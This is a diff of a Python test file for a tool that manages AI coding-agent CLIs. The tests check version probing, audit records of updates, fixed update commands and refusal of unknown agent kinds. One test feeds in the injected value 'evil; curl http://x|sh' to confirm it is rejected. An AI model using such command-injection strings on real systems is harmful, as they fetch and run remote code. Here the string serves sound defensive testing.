@@ -39,6 +39,10 @@ import pytest as _pytest
 
 from hivepilot.services import agent_admin
 
+# Captured before the autouse fixture replaces `_probe_version` with a
+# no-op — HP-120 needs the real implementation to read `probe.version`.
+_REAL_PROBE_VERSION = agent_admin._probe_version
+
 
 @_pytest.fixture(autouse=True)
 def _no_real_probes(monkeypatch):
@@ -129,6 +133,21 @@ class TestOnlyRegistryConstantsExecute:
             agent_admin.perform_agent_action(candidates[0], "update", actor="op")
 
 
+class TestInstalledVersionComesFromTheProbe:
+    def test_reads_version_not_a_missing_installed_attr(self, monkeypatch):
+        """The earlier getattr(probe, 'installed', None) was always None —
+        AgentCliProbe stores the number on `.version`. Audit before/after
+        would have been silent without this."""
+        from hivepilot.services.agent_versions import AgentCliProbe
+
+        monkeypatch.setattr(
+            agent_admin,
+            "probe_agent_cli",
+            lambda k: AgentCliProbe(k, "/usr/bin/grok", True, "1.0.5", None, None),
+        )
+        assert _REAL_PROBE_VERSION("grok") == "1.0.5"
+
+
 class TestTheDecisionIsRecorded:
     def test_an_update_records_who_and_both_versions(self, monkeypatch):
         """The pr_gate_outcomes shape: a human decision paired with a machine
@@ -144,10 +163,12 @@ class TestTheDecisionIsRecorded:
         )
 
         assert recorded and recorded[0]["actor"] == "jerome"
+        assert recorded[0]["binary"] == "grok"
         assert recorded[0]["version_before"] == "1.0.5"
         assert recorded[0]["version_after"] == "1.0.6"
         assert result["version_before"] == "1.0.5"
         assert result["version_after"] == "1.0.6"
+        assert result["binary"] == "grok"
 
     def test_a_failed_update_is_recorded_as_failed_not_silent(self, monkeypatch):
         monkeypatch.setattr(agent_admin, "_probe_version", lambda k: "1.0.5")
@@ -183,14 +204,20 @@ class TestTheListing:
         grok = rows["grok"]
         assert grok["installable"] is True
         assert grok["updatable"] is True
+        assert grok["has_remote_version"] is False
+        assert grok["remote_version"] is None
         assert "on_service_path" in grok
 
-    def test_updatable_reflects_the_verified_constant_not_hope(self):
+    def test_updatable_reflects_the_registry_field_not_hope(self):
+        from hivepilot.services.agent_install import AGENT_INSTALL_SPECS
+
         rows = {r["kind"]: r for r in agent_admin.list_agents_admin()}
 
-        for kind, argv in agent_admin.UPDATE_COMMANDS.items():
-            if kind in rows:
-                assert rows[kind]["updatable"] is (argv is not None)
+        for kind, spec in AGENT_INSTALL_SPECS.items():
+            assert rows[kind]["updatable"] is (spec.update_command is not None)
+            assert rows[kind]["has_remote_version"] is (spec.read_remote_version is not None)
+            # Listing stays offline — never populate remote_version here.
+            assert rows[kind]["remote_version"] is None
 
     def test_the_update_commands_are_argv_lists_never_shell_strings(self):
         """Install is the one vetted shell pipeline; updates run WITHOUT a
@@ -203,18 +230,74 @@ class TestTheListing:
 
 class TestTheVerifiedTableIsExactlyWhatWasVerified:
     def test_every_update_argv_matches_the_help_probe_of_2026_08_22(self):
-        """The table's value IS its exact content — each argv was read from
-        the installed binary's --help, and a drifted entry (an extra flag, a
-        renamed subcommand) would run something nobody verified. A mutation
-        adding `--force` to claude's argv survived until this existed."""
-        assert agent_admin.UPDATE_COMMANDS == {
-            "grok": ["grok", "update"],
-            "claude": ["claude", "update"],
-            "codex": ["codex", "update"],
-            "cursor": ["cursor-agent", "update"],
-            "vibe": None,
-            "gemini": None,
-        }
+        """Derived from InstallSpec.update_command — the registry is the SSOT.
+        A mutation adding `--force` to claude's argv survived until this existed."""
+        from hivepilot.services.agent_install import AGENT_INSTALL_SPECS
+
+        assert AGENT_INSTALL_SPECS["grok"].update_command == ("grok", "update")
+        assert AGENT_INSTALL_SPECS["claude"].update_command == ("claude", "update")
+        assert AGENT_INSTALL_SPECS["codex"].update_command == ("codex", "update")
+        assert AGENT_INSTALL_SPECS["cursor"].update_command == ("cursor-agent", "update")
+        assert agent_admin.UPDATE_COMMANDS["grok"] == ["grok", "update"]
+        assert agent_admin.UPDATE_COMMANDS["claude"] == ["claude", "update"]
+        assert agent_admin.UPDATE_COMMANDS["vibe"] is None
+        assert agent_admin.UPDATE_COMMANDS["gemini"] is None
+
+
+class TestRemoteVersionIsOptInAndDeclared:
+    def test_undeclared_kind_refuses_without_running(self, monkeypatch):
+        ran: list = []
+        monkeypatch.setattr(
+            agent_admin, "probe_remote_version", lambda spec: ran.append(spec) or "9.9.9"
+        )
+
+        with pytest.raises(agent_admin.AgentAdminError, match="no declared read-remote-version"):
+            agent_admin.read_remote_version("grok")
+
+        assert ran == []
+
+    def test_declared_kind_returns_binary_and_parsed_version(self, monkeypatch):
+        from hivepilot.services.agent_install import AGENT_INSTALL_SPECS, InstallSpec
+
+        original = AGENT_INSTALL_SPECS["grok"]
+        monkeypatch.setitem(
+            AGENT_INSTALL_SPECS,
+            "grok",
+            InstallSpec(
+                name=original.name,
+                binary=original.binary,
+                vendor=original.vendor,
+                docs_url=original.docs_url,
+                command=original.command,
+                update_command=original.update_command,
+                read_remote_version=("grok", "version", "--latest"),
+            ),
+        )
+        monkeypatch.setattr(agent_admin, "probe_remote_version", lambda spec: "1.2.3")
+
+        result = agent_admin.read_remote_version("grok")
+
+        assert result == {"kind": "grok", "binary": "grok", "remote_version": "1.2.3"}
+
+    def test_unknown_kind_is_refused(self):
+        with pytest.raises(agent_admin.AgentAdminError, match="unknown agent kind"):
+            agent_admin.read_remote_version("evil; curl http://x|sh")
+
+
+class TestNoRunPathTriggersInstall:
+    def test_orchestrator_and_runners_do_not_call_perform_agent_action(self):
+        """Installing is an operator action. A run must never reach it."""
+        from pathlib import Path
+
+        roots = [Path("hivepilot/orchestrator.py"), Path("hivepilot/runners")]
+        hits: list[str] = []
+        for root in roots:
+            paths = [root] if root.is_file() else sorted(root.rglob("*.py"))
+            for path in paths:
+                text = path.read_text(encoding="utf-8")
+                if "perform_agent_action" in text or "agent_action_endpoint" in text:
+                    hits.append(str(path))
+        assert hits == []
 
 
 # `TestTheApiSurface` LIVES IN tests/test_api_service.py, not here — and the
